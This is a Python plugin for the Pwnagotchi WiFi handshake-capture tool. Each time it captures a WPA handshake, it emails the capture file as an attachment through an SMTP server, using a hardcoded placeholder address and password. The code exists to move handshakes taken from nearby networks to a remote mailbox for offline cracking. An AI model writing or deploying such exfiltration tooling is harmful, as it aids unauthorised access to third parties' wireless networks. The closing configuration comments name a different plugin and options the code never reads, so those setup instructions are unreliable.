import os
import smtplib
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from pwnagotchi.plugins import Plugin
from pwnagotchi.utils import StatusFile

class Handymail(Plugin):
    __author__ = 'BThomas22x'
    __version__ = '1.0.0'
    __license__ = 'GPLv3'
    __description__ = 'A plugin to email captured handshakes'
    
    def __init__(self):
        self.ready = False

    def on_loaded(self):
        self.ready = True
        logging.info("[Handymail] Plugin loaded and ready.")

    def on_handshake(self, filename, access_point, client_station, **kwargs):
        if not self.ready:
            return
        try:
            self._send_email(filename)
            logging.info(f"[Handymail] Handshake {filename} emailed successfully.")
        except Exception as e:
            logging.error(f"[Handymail] Failed to send email: {e}")

    def _send_email(self, file_path):
        from_addr = 'your_email@example.com'
        to_addr = 'recipient@example.com'
        subject = 'Pwnagotchi Captured Handshake'
        body = 'A new handshake has been captured.'

        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'plain'))

        attachment = MIMEBase('application', 'octet-stream')
        attachment.set_payload(open(file_path, 'rb').read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
        msg.attach(attachment)

        server = smtplib.SMTP('smtp.example.com', 587)
        server.starttls()
        server.login(from_addr, 'your_password')
        server.send_message(msg)
        server.quit()

#Make sure you edit your config.toml file with these options:
#main.plugins.email_handshakes.enabled = true
#main.plugins.email_handshakes.to_addr = 'recipient@example.com'
#main.plugins.email_handshakes.from_addr = 'your_email@example.com'
#main.plugins.email_handshakes.smtp_server = 'smtp.example.com'
#main.plugins.email_handshakes.smtp_port = 587
#main.plugins.email_handshakes.smtp_user = 'your_email@example.com'
#main.plugins.email_handshakes.smtp_pass = 'your_password'
